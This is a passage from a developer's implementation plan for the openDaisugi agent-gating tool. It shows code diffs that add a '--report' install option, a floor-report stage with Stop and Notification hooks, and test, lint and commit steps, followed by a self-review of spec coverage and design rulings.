        return False
    entries = data.get("hooks", {}).get(event, [])
    cmds = [h.get("command", "") for e in entries for h in e.get("hooks", [])]
    return any(kind_substr in c for c in cmds)
```

```python
# OLD
    matcher_cfg = load_config(data_dir / "config.yaml")
    matcher_sel = matcher_cfg.matcher_model
```

```python
# NEW
    matcher_cfg = load_config(data_dir / "config.yaml")
    matcher_sel = matcher_cfg.matcher_model
    report_pref = matcher_cfg.floor_report
    herdr_hooks_on = _claude_hook_installed(
        "--event stop", event="Stop"
    ) or _claude_hook_installed("--event notification", event="Notification")
    herdr_binary_present = shutil.which("herdr") is not None
```

```python
# OLD
        Stage(
            "stores",
            "stores (local-first)",
            "where trust and pathways live — on your disk",
            [
                Module("journal (sqlite)", ACTIVE, f"{status.journal_total} traces"),
                Module("pathway store (sqlite)", ACTIVE, f"{status.pathway_count} pathways"),
                Module("git-backed store", AVAILABLE, "shareable pathway registry"),
            ],
        ),
    ]
```

```python
# NEW
        Stage(
            "stores",
            "stores (local-first)",
            "where trust and pathways live — on your disk",
            [
                Module("journal (sqlite)", ACTIVE, f"{status.journal_total} traces"),
                Module("pathway store (sqlite)", ACTIVE, f"{status.pathway_count} pathways"),
                Module("git-backed store", AVAILABLE, "shareable pathway registry"),
            ],
        ),
        Stage(
            "floor",
            "floor report (state → a pane host)",
            "tells whatever pane host is listening: idle, working, blocked, done",
            [
                Module(
                    "herdr",
                    ACTIVE if herdr_hooks_on else (AVAILABLE if herdr_binary_present else POSSIBLE),
                    "Stop + Notification hooks installed"
                    if herdr_hooks_on
                    else (
                        "run `daisugi install --gate --report herdr`"
                        if herdr_binary_present
                        else "install Herdr first"
                    ),
                ),
                Module(
                    "coppice",
                    ACTIVE if report_pref == "coppice" else POSSIBLE,
                    "preference recorded"
                    if report_pref == "coppice"
                    else "harness/coppice not built yet",
                ),
                Module(
                    "none",
                    ACTIVE if not herdr_hooks_on and report_pref != "coppice" else AVAILABLE,
                    "no floor listening",
                ),
            ],
        ),
    ]
```

Modify `src/opendaisugi/swap.py` — B2: `STAGE_EFFECT` must cover the new `"floor"` stage in the
SAME task that adds it, or `tests/test_swap.py::test_effect_is_three_valued_and_covers_every_stage`
(`assert set(STAGE_EFFECT) == stage_keys`) goes red the moment `detect_stages` grows it:

```python
# OLD
STAGE_EFFECT: dict[str, str] = {
    "harness": CFG,  # via `daisugi install` into your agent host
    "gate": CFG,  # via `daisugi install --enforce/--shadow`
    "verifier": PLANNED,  # python enforces; clients not dispatched at runtime
    "shell": LIVE,
    "envelope": CFG,  # needs a configured backend
    "backend": CFG,  # via OPENDAISUGI_LLM_BACKEND + restart
    "matcher": CFG,  # matcher_model selects the embedder; reload to load it
    "router": CFG,  # via `daisugi gateway` (launch)
    "distill": LIVE,
    "stores": PLANNED,  # git store is a separate `daisugi registry init`
}
```

```python
# NEW
STAGE_EFFECT: dict[str, str] = {
    "harness": CFG,  # via `daisugi install` into your agent host
    "gate": CFG,  # via `daisugi install --enforce/--shadow`
    "verifier": PLANNED,  # python enforces; clients not dispatched at runtime
    "shell": LIVE,
    "envelope": CFG,  # needs a configured backend
    "backend": CFG,  # via OPENDAISUGI_LLM_BACKEND + restart
    "matcher": CFG,  # matcher_model selects the embedder; reload to load it
    "router": CFG,  # via `daisugi gateway` (launch)
    "distill": LIVE,
    "stores": PLANNED,  # git store is a separate `daisugi registry init`
    # cfg, not live: the Stop/Notification hooks live in settings.json,
    # which the harness owns and reloads, not us — same reason gate mode
    # stays cfg (§5.9), spec-01.
    "floor": CFG,
}
```

Modify `src/opendaisugi/cli.py`'s `install_cmd`. Add the option (right after `base_url`):

```python
# OLD
    base_url: str = typer.Option(
        "http://127.0.0.1:8787",
        "--base-url",
        help="Gateway base_url to wire in when --gateway is set.",
    ),
) -> None:
```

```python
# NEW
    base_url: str = typer.Option(
        "http://127.0.0.1:8787",
        "--base-url",
        help="Gateway base_url to wire in when --gateway is set.",
    ),
    report: str = typer.Option(
        None,
        "--report",
        help="Report gate state (idle/working/blocked/done) to a floor host. "
        "herdr wires Stop + Notification hooks (Claude Code only); coppice "
        "records the preference in config.yaml (harness/coppice isn't "
        "built yet). Only meaningful together with --gate.",
    ),
) -> None:
```

Add validation and the `effective_report` gate, right after the existing `--ask` note:

```python
# OLD
    if ask and not (gate and enforce):
        typer.echo("Note: --ask only applies with --gate --enforce; no operator ask will be wired.")
    # The message above is the contract: --ask without --gate --enforce is a
    # no-op. effective_ask is what actually reaches every call site below —
    # a plain `ask` here would bake --ask (and the widened ~105s hook
    # timeout) into a SHADOW-mode install while telling the operator it
    # wasn't wired.
    effective_ask = ask and gate and enforce
```

```python
# NEW
    if ask and not (gate and enforce):
        typer.echo("Note: --ask only applies with --gate --enforce; no operator ask will be wired.")
    # The message above is the contract: --ask without --gate --enforce is a
    # no-op. effective_ask is what actually reaches every call site below —
    # a plain `ask` here would bake --ask (and the widened ~105s hook
    # timeout) into a SHADOW-mode install while telling the operator it
    # wasn't wired.
    effective_ask = ask and gate and enforce

    if report is not None and report not in ("herdr", "coppice"):
        # Global Constraints §Exit codes: 1 = user error, not 2 (gate deny)
        # — a bad --report value never touched the gate.
        typer.echo(f"Error: --report must be 'herdr' or 'coppice', got {report!r}", err=True)
        raise typer.Exit(code=1)
    if report and not gate:
        typer.echo("Note: --report only applies with --gate; no floor-report hooks will be installed.")
    effective_report = report if gate else None
```

Thread `report=effective_report` into both `rt.plan(...)` and `_install(...)`:

```python
# OLD
    plans = {
        rt.name: rt.plan(home, selected_layers, enforce=enforce, ask=effective_ask, base_url=base_url)
        for rt in runtimes
    }
```

```python
# NEW
    plans = {
        rt.name: rt.plan(home, selected_layers, enforce=enforce, ask=effective_ask,
                         base_url=base_url, report=effective_report)
        for rt in runtimes
    }
```

```python
# OLD
    result = _install(
        home=home,
        yes=True,
        runtimes=runtimes,
        layers=selected_layers,
        enforce=enforce,
        ask=effective_ask,
        base_url=base_url,
    )
```

```python
# NEW
    result = _install(
        home=home,
        yes=True,
        runtimes=runtimes,
        layers=selected_layers,
        enforce=enforce,
        ask=effective_ask,
        base_url=base_url,
        report=effective_report,
    )
```

Add the coppice config-persistence block right after the shell-decomposition persistence block
(before the auto-tend consent block):

```python
# OLD
        _warn_if_decomposition_unusable(allow_shell_decomposition)

    # Ask once whether to distil repeated tasks in the background (Phase A).
```

```python
# NEW
        _warn_if_decomposition_unusable(allow_shell_decomposition)

    if effective_report == "coppice":
        from opendaisugi.config import load_config, save_config

        cfg_path = home / ".opendaisugi" / "config.yaml"
        save_config(load_config(cfg_path).model_copy(update={"floor_report": "coppice"}), cfg_path)
        typer.echo(
            f"Floor report set to coppice. Saved in {cfg_path}. Nothing listens for it yet. "
            "The coppice server is not built."
        )

    # Ask once whether to distil repeated tasks in the background (Phase A).
```

- [ ] **Step 4: Run the tests to confirm they pass, and confirm no regression**

Run: `cd /mnt/tera/working/programming/openDaisugi && uv run --no-sync pytest tests/test_install_gate_report.py tests/test_modules.py tests/test_swap.py tests/test_install_gate_baseurl.py tests/test_install.py tests/test_cli_gate_decomposition.py -q`
Expected: all pass — in particular `tests/test_install_gate_baseurl.py` and `tests/test_install.py`
passing unchanged confirms the `_pop_json_hook` generalization and the new `report` parameter are
additive, not breaking; `tests/test_swap.py` passing (specifically
`test_effect_is_three_valued_and_covers_every_stage`) confirms the new `"floor"` stage got its
`STAGE_EFFECT` tag in this same task (B2, spec-01).

- [ ] **Step 5: Full-suite verification and lint**

Run: `cd /mnt/tera/working/programming/openDaisugi && uv run --no-sync pytest -q`
Expected: the whole suite is green (no new failures anywhere — the `_state_report`/`floor`
package is new and additive, and every modified file's existing tests were re-run in this
plan's own steps).

Run: `cd /mnt/tera/working/programming/openDaisugi && uv run --no-sync ruff check .`
Expected: clean.

- [ ] **Step 6: Commit**

```bash
git add src/opendaisugi/install.py src/opendaisugi/config.py src/opendaisugi/modules.py src/opendaisugi/swap.py src/opendaisugi/cli.py tests/test_install_gate_report.py tests/test_modules.py tests/test_swap.py
git commit -m "feat(install): --gate --report herdr wires Stop+Notification hooks; coppice records intent; daisugi modules shows both honestly"
```

---

## Self-review

**Spec coverage.** Every named deliverable in spec-01 maps to a task:
- `opendaisugi.floor` package (`PaneStateEvent`, `Ask`, `merge`, `PaneBackend`, `PaneRef`,
  `PaneInfo`, `Frame`) — Task 2.
- The layer-purity indirection (`opendaisugi/_state_report.py` in the layer,
  `opendaisugi/floor/report.py` re-exporting) — Task 1.
- `gate.py` reports state after `_log_tree`/`_maybe_ask`/`_maybe_checkpoint`, with the
  allow/deny/ask-posted/ask-resolved state table — Task 3.
- `hook.py`'s `--event stop|notification` handling — Task 4.
- `daisugi hook report` (validate, downgrade, append, deliver; reachable via CLI and via
  `gate.sock`) — Task 1 (the pure function) + Task 4 (both entry points).
- `install.py`'s `--report herdr` (Stop + Notification hooks, idempotent, reversible) and
  `--report coppice` (config-only) — Task 5.
- The Herdr env-var discovery (plan task 1, "if Herdr is absent, keep the fallback list and mark
  the module docstring unverified") — Task 1 Step 1/4, confirmed absent in Task 0 Step 2.
- Honesty tags (`daisugi modules` §3.5) for the new floor-report capability — Task 5.
- `tests/floor/test_events.py`, `tests/floor/test_report.py`, `tests/test_hook_report_events.py`
  — created exactly as spec-01 names them (plus `tests/floor/test_backend.py` and
  `tests/test_state_report.py`, additional coverage the spec's list does not preclude).

**Not mapped to a task (out of spec-01's scope, per its own "Out of scope" section):** the
coppice binary, any pane backend implementation, and a Codex Stop-equivalent (Codex hooks are
fail-open class and have no Stop event; the honesty tag in `modules.py`'s existing "codex
hooks.json" module already says so and is untouched here).

**Placeholder scan.** No "TBD"/"handle later"/"similar to Task N" — every step above shows the
actual code, not a description of it. `HERDR_PANE_ENV_CANDIDATES` is a concrete tuple, not a
guess deferred to a later task; Task 0 Step 2 pins the fact (Herdr absent) that Task 1's
docstring depends on.

**Type/signature consistency, checked task-by-task:**
- `build_event(...) -> str` (Task 1) is called with identical keyword names in `gate.py` (Task 3)
  and `hook.py` (Task 4).
- `report_state(ev_json, *, env=..., budget_s=...) -> str` (Task 1) is the exact signature
  `floor/report.py` re-exports (Task 1) and every caller uses (Tasks 3, 4).
- `_maybe_ask(root, payload, decision, *, timeout_s, session_id=None, fmt="claude", sleep=..., clock=...)`
  (Task 3) matches the one new call site in `gate_and_contract` (same task) and leaves every
  existing `tests/test_ask.py` call site (positional/keyword args unchanged) valid.
- `_log_tree(...) -> SessionTree | None` (Task 3) is the exact type `_maybe_report_state`'s new
  `tree` parameter expects, and `gate_and_contract`'s one call site binds them together in the
  same task; every prior caller already discarded `_log_tree`'s return value, so the type change
  is additive.
- `_report_and_append_state(..., tree: SessionTree | None = None)` (Task 3) is called with
  `tree=None` from `_report_blocked` (no open tree to reuse yet) and `tree=tree` from
  `_maybe_report_state` (reusing `_log_tree`'s); both call sites and the default agree.
- `PaneStateEvent`/`Ask`/`effective_state` (Task 2) and `_validate_hook_report_row`/`STATES`/`SOURCES`
  (Task 1) are two independent implementations by design (layer purity); Task 2's cross-check
  test is the mechanism that keeps them from silently disagreeing, not a shared import.
- `STAGE_EFFECT["floor"]` (Task 5) is added in the SAME task that adds `modules.py`'s `"floor"`
  `Stage`, so `tests/test_swap.py`'s cover-every-stage assertion never goes red between commits.
- `_pop_json_hook(settings_path, *, hook_substr, events=("PreToolUse",))` (Task 5) is called with
  the new `events=("Stop", "Notification")` only from the one new call site added in the same
  task; every pre-existing call site is untouched text, so the default keeps them byte-identical.
- `Runtime.plan/apply(..., report: str | None = None)` (Task 5) is accepted by all four concrete
  runtime classes (mechanical `replace_all` edit) before `install()`'s two call sites pass it.

## Concerns / rulings

1. **Validation duplication is intentional, not an oversight.** `opendaisugi.floor.events.PaneStateEvent` owns the canonical §3.1 rules; `opendaisugi._state_report._validate_hook_report_row` is a second, independent implementation used only by `hook_report_argv` (reachable through `gate.sock`, where the caller — `gate_server.py` — is a layer module and cannot import `opendaisugi.floor`). `tests/floor/test_events.py::test_layer_validator_and_dataclass_agree_on_every_rule` pins the two to the same accept/reject verdict; it is the guard against them drifting apart, not a suggestion to unify them into one import (that would just move the ownership violation from "layer imports floor" to "floor's contract lives in the layer").
2. **`merge()`'s expiry releases the hold for a fresh incoming event; `effective_state()` (Task 2, added in the fix round) is the read-time counterpart for when no fresh event ever arrives.** Two paths genuinely produce a hold nothing ever clears: `gate_and_contract`'s `is_disarmed` early return emits no report at all, and a gate-process crash between `post_ask` and its own resolving `working` report leaves the last stored event `blocked` forever. `merge()` cannot fix either case (it only runs when a second event exists to merge against); `effective_state(current, *, now)` is the named home for "a reader with nothing fresh still needs the deadline to expire" so spec-02/03 (the coppice-server, the cockpit) build on ONE implementation instead of inventing their own release logic independently and drifting.
3. **The Notification payload's `notification_type` field IS documented** (https://code.claude.com/docs/en/hooks) — the original plan wrongly called it unverifiable and used `bool(notification_type)` as the blocked/idle test, which would have reported every one of the twelve documented values as `blocked`, including `idle_prompt`, `agent_completed`, and `auth_success`. `record_lifecycle_event` (Task 4, fixed) now classifies against the four values that actually mean a human is being asked something (`permission_prompt`, `elicitation_dialog`, `elicitation_url_dialog`, `agent_needs_input`), falling back to a `"permission"` substring match on `message` only when the field is absent. Five tests (two rewritten to use real values, two new) each pin one branch.
4. **The fix round's own root cause, generalized: an escape from a best-effort helper is only harmless if EVERY call site to it is wrapped, not just the helper's own internals.** The original `_report_and_append_state` correctly wrapped its own build/deliver/append steps, but its TWO CALLERS (`_report_blocked`, `_maybe_report_state`) built their preambles (session-id sanitizing, the detail format string, the harness lookup) outside any try — so an escape there reached `gate_and_contract`'s mode-selected failure policy (rewriting an already-final verdict) or skipped `_maybe_ask`'s `wait_answer` entirely. The fix wraps three layers deep: the helper's own steps, each caller's own preamble, and each call site — belt, braces, and a third belt, because this is exactly the kind of defense a monkeypatched test can make look sufficient one layer too early (as the original two tests did, patching `report_state`, two calls deep from where the actual gap was).
5. **`daisugi hook report`'s two entry points (CLI subprocess, `gate.sock` dispatch) share one pure function** (`hook_report_argv`, Task 1) rather than duplicating the parse/validate/downgrade/append/deliver sequence — the CLI command and `gate_server.py`'s new dispatch branch are both thin wrappers (Task 4).
6. **Sized to 5 tasks (plus Task 0, a non-code environment check), inside the spec's S ≈ 3–5 guideline**, by folding the Herdr discovery into Task 1's first step rather than giving it a standalone task — the deliverable (a recorded, tested fact) exists either way; a reviewer could not meaningfully approve or reject a 15-line constant-plus-docstring independently of the module it lives in.
